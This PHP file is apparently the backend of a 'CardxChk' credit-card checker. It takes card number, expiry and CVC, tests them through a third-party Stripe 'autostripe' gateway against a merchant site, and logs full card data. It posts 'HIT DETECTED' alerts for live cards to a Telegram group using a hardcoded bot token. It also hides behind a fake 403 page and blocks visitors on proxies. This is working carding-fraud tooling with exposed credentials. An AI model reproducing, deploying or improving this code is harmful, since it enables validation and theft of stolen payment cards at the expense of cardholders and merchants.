<?php
// Check if this is a GET request and show the HTML page immediately
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    header('Content-Type: text/html; charset=utf-8');
    http_response_code(403);
    
    echo '<html style="height:100%"> 
          <head> 
          <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /> 
          <title> 403 Forbidden </title>
          <style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style>
          </head> 
          <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;"> 
          <div style="height:auto; min-height:100%; "> 
          <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;"> 
          <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1> 
          <h2 style="margin-top:20px;font-size: 30px;">Forbidden </h2> 
          <p>Access to this resource on the server is denied!</p> 
          </div></div></body></html>';
    
    exit;
}

header('Content-Type: application/json');

// Enable error logging
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');

// --- MOVED log_message function to the top to prevent 500 errors ---
// Optional file-based logging for debugging
 $log_file = __DIR__ . '/paypal0.1$_debug.log';
function log_message($message) {
    global $log_file;
    $timestamp = date('Y-m-d H:i:s');
    // Ensure the message is a string
    $log_entry = is_array($message) || is_object($message) ? json_encode($message) : $message;
    file_put_contents($log_file, "$timestamp - $log_entry\n", FILE_APPEND);
}

// --- PROXY DETECTION LOGIC - MOVED TO TOP FOR ALL REQUESTS ---

// Function to get the real user IP address
function getUserIP() {
    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($ip_keys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1';
}

// Function to check if IP is a proxy
function checkProxyIP($ip) {
    // Check if cURL is available
    if (!function_exists('curl_init')) {
        log_message("cURL extension is not installed. Cannot perform proxy check.");
        return false; // Fail open (allow access) if we can't check
    }

    $api_url = "https://api.isproxyip.com/v1/check.php?key=zHwDyAMU6bJMIHCKfcDGnjMi7zq3S743dQXWBoqKNPCPEW4z94&ip=" . urlencode($ip) . "&format=json";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // 10-second timeout
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        log_message("Proxy check CURL error for IP $ip: $error");
        return false; // Fail open on error
    }
    
    if ($http_code !== 200) {
        log_message("Proxy check HTTP error for IP $ip: Status Code $http_code. Response: $response");
        return false; // Fail open on error
    }
    
    $data = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE || !isset($data['proxy'])) {
        log_message("Proxy check JSON decode error or missing 'proxy' key for IP $ip. Response: $response");
        return false; // Fail open on error
    }
    
    // Log the proxy check result
    log_message("Proxy check result for IP $ip: " . json_encode($data));
    
    // Return true if proxy is detected (value > 0)
    return (int)$data['proxy'] > 0;
}

// Function to display simple 403 Forbidden page
function showForbiddenPage() {
    // Reset content type to HTML
    header('Content-Type: text/html; charset=utf-8');
    http_response_code(403);
    
    echo '<html style="height:100%"> 
          <head> 
          <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /> 
          <title> 403 Forbidden </title>
          <style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style>
          </head> 
          <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;"> 
          <div style="height:auto; min-height:100%; "> 
          <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;"> 
          <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1> 
          <h2 style="margin-top:20px;font-size: 30px;">Forbidden </h2> 
          <p>Access to this resource on the server is denied!</p> 
          </div></div></body></html>';
    
    exit; // Ensure script execution stops completely
}

// Get user's IP address and check for proxy - FOR ALL REQUESTS
 $user_ip = getUserIP();
log_message("Request received from IP: $user_ip");

if (checkProxyIP($user_ip)) {
    log_message("ACCESS DENIED - Proxy detected for IP: $user_ip");
    showForbiddenPage();
    exit; // Double ensure script execution stops
}

// --- END OF PROXY DETECTION LOGIC ---

// Include cron_sync.php for validateApiKey
require_once __DIR__ . '/refresh.php';

// Start session for user authentication
session_start([
    'cookie_secure' => isset($_SERVER['HTTPS']),
    'cookie_httponly' => true,
    'use_strict_mode' => true,
]);

// Check if user is authenticated
if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
    log_message('Error 401: ' . json_encode($errorMsg));
    echo json_encode($errorMsg);
    exit;
}

// Validate API key
 $validation = validateApiKey();
if (!$validation['valid']) {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
    log_message('Error 401: ' . json_encode($errorMsg));
    echo json_encode($errorMsg);
    exit;
}

 $expectedApiKey = $validation['response']['apiKey'];
 $providedApiKey = $_SERVER['HTTP_X_API_KEY'] ?? '';
if ($providedApiKey !== $expectedApiKey) {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
    log_message('Error 401: ' . json_encode($errorMsg));
    echo json_encode($errorMsg);
    exit;
}

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Track sent notifications to prevent duplicates
 $sent_notifications = [];

// Function to check for 3DS responses
function is3DAuthenticationResponse($response) {
    $responseUpper = strtoupper($response);
    return strpos($responseUpper, '3D_AUTHENTICATION') !== false ||
           strpos($responseUpper, '3DS') !== false ||
           strpos($responseUpper, 'THREE_D_SECURE') !== false ||
           strpos($responseUpper, 'REDIRECT') !== false ||
           strpos($responseUpper, 'VERIFICATION_REQUIRED') !== false ||
           strpos($responseUpper, 'ADDITIONAL_AUTHENTICATION') !== false ||
           strpos($responseUpper, 'AUTHENTICATION_REQUIRED') !== false ||
           strpos($responseUpper, 'CHALLENGE_REQUIRED') !== false;
}

// Function to format response (remove status prefix and brackets)
function formatResponse($response) {
    $statusPrefixPattern = '/^(APPROVED|CHARGED|DECLINED|3DS)\s*\[(.*)\]$/i';
    if (preg_match($statusPrefixPattern, $response, $match)) {
        return $match[2];
    }
    $bracketsPattern = '/^\[(.*)\]$/';
    if (preg_match($bracketsPattern, $response, $match)) {
        return $match[1];
    }
    return $response;
}

// Function to send Telegram notification
function sendTelegramNotification($card_details, $status, $response, $originalApiResponse = null) {
    global $sent_notifications;
    
    // Create a unique key for this card to prevent duplicates
    $notification_key = md5($card_details . $status . $response);
    
    // Check if we've already sent this notification
    if (isset($sent_notifications[$notification_key])) {
        log_message("Skipping duplicate notification for $card_details: $status");
        return;
    }
    
    // Mark this notification as sent
    $sent_notifications[$notification_key] = true;
    
    // Check both formatted response and original API response for 3DS
    $checkResponse = $originalApiResponse ? $originalApiResponse : $response;
    if (is3DAuthenticationResponse($checkResponse)) {
        log_message("Skipping Telegram notification for 3DS response: $checkResponse");
        return;
    }
    
    // Only proceed if status is CHARGED or APPROVED
    if ($status !== 'CHARGED' && $status !== 'APPROVED') {
        log_message("Skipping notification - status is not CHARGED or APPROVED: $status");
        return;
    }

    // Load Telegram Bot Token from environment (secure storage)
    $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
    $chat_id = '-1003204998888'; // Your group chat ID
    $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
    $site_link = 'https://cxchk.site';

    // Get user info from session
    $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
    $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
    $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
    $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
    $gateway = 'Stripe Auth'; // Updated for this gateway
    $formatted_response = formatResponse($response);

    // Construct Telegram message
    $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! ]━━✦</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
               "<b>――――――――――――</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";

    // Send to Telegram
    $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $payload = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];

    $ch = curl_init($telegram_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);

    if ($http_code !== 200 || !$result) {
        log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Error: $curl_error, Response: " . ($result ?: 'No response'));
    } else {
        log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
    }
}

// Check if card details are provided
if (!isset($_POST['card']) || !is_array($_POST['card'])) {
    echo json_encode(['status' => 'ERROR', 'message' => 'Card details not provided']);
    exit;
}

// Function to check a single card via API
function checkCard($card_number, $exp_month, $exp_year, $cvc) {
    // Prepare card details for API and display
    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
    $encoded_cc = urlencode($card_details);
    
    // API endpoint configuration
    $api_url = "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=funkybears.net//cc=$encoded_cc";

    // Initialize cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; consider enabling in production with proper SSL

    // Execute request
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);

    // Handle API errors
    if ($response === false || $http_code !== 200 || !empty($curl_error)) {
        log_message("API request failed: $curl_error (HTTP $http_code) for $card_details");
        return ['status' => 'DECLINED', 'message' => "API request failed: $curl_error (HTTP $http_code)"];
    }

    // Parse JSON response
    $result = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'], $result['response'])) {
        log_message("Invalid API response: " . substr($response, 0, 100) . " for $card_details");
        return ['status' => 'DECLINED', 'message' => "Invalid API response: " . substr($response, 0, 100)];
    }

    $status = strtoupper($result['status']);
    $response_msg = htmlspecialchars($result['response'], ENT_QUOTES, 'UTF-8'); // Sanitize response message

    // Check if response contains "Succeeded" (case-insensitive)
    $is_succeeded = stripos($response_msg, 'Succeeded') !== false;
    
    // Determine our status based on API response
    $our_status = 'DECLINED';
    $our_message = $response_msg;
    
    if ($status === "APPROVED" || $is_succeeded) {
        // If it's a "Succeeded" response, change the message
        if ($is_succeeded) {
            $our_status = 'APPROVED';
            $our_message = 'Payment Method added successfully.';
        } else {
            $our_status = 'APPROVED';
        }
    } elseif ($status === "DECLINED") {
        $our_status = 'DECLINED';
    } else {
        $our_status = 'DECLINED';
        $our_message = "Unknown status: $status";
    }
    
    log_message("$our_status for $card_details: $our_message");
    
    // Send Telegram notification for APPROVED status
    if ($our_status === 'APPROVED') {
        sendTelegramNotification($card_details, $our_status, $our_message, $response);
    }
    
    return ['status' => $our_status, 'message' => $our_message];
}

// Check if the request is POST and contains card data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card']) || !is_array($_POST['card'])) {
    log_message("Invalid request or missing card data");
    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid request or missing card data']);
    exit;
}

 $card = $_POST['card'];
 $required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];

// Validate card data
foreach ($required_fields as $field) {
    if (empty($card[$field])) {
        log_message("Missing $field");
        echo json_encode(['status' => 'ERROR', 'message' => "Missing $field"]);
        exit;
    }
}

// Sanitize inputs
 $card_number = preg_replace('/[^0-9]/', '', $card['number']);
 $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
 $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
 $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

// Normalize exp_month to 2 digits
 $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
    log_message("Invalid exp_month format: $exp_month_raw");
    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid exp_month format']);
    exit;
}

// Normalize exp_year to 4 digits
if (strlen($exp_year_raw) == 2) {
    $current_year = (int) date('y'); // Last two digits of current year (e.g., 25 for 2025)
    $current_century = (int) (date('Y') - $current_year); // e.g., 2000 for 2025
    $card_year = (int) $exp_year_raw;
    $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
} elseif (strlen($exp_year_raw) == 4) {
    $exp_year = (int) $exp_year_raw;
} else {
    log_message("Invalid exp_year format: $exp_year_raw");
    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid exp_year format - must be YY or YYYY']);
    exit;
}

// Basic validation
if (!preg_match('/^\d{13,19}$/', $card_number)) {
    log_message("Invalid card number format: $card_number");
    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid card number format']);
    exit;
}
if (!preg_match('/^\d{4}$/', (string) $exp_year)) {
    log_message("Invalid exp_year format after normalization: $exp_year");
    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid exp_year format after normalization']);
    exit;
}
if (!preg_match('/^\d{3,4}$/', $cvc)) {
    log_message("Invalid CVC format: $cvc");
    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid CVC format']);
    exit;
}

// Validate logical expiry
 $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
 $current_timestamp = strtotime('first day of this month');
if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
    log_message("Card expired: $card_number|$exp_month|$exp_year|$cvc");
    echo json_encode(['status' => 'ERROR', 'message' => 'Card expired']);
    exit;
}

// Check single card and output JSON response
 $result = checkCard($card_number, $exp_month, $exp_year, $cvc);
echo json_encode($result);
?>
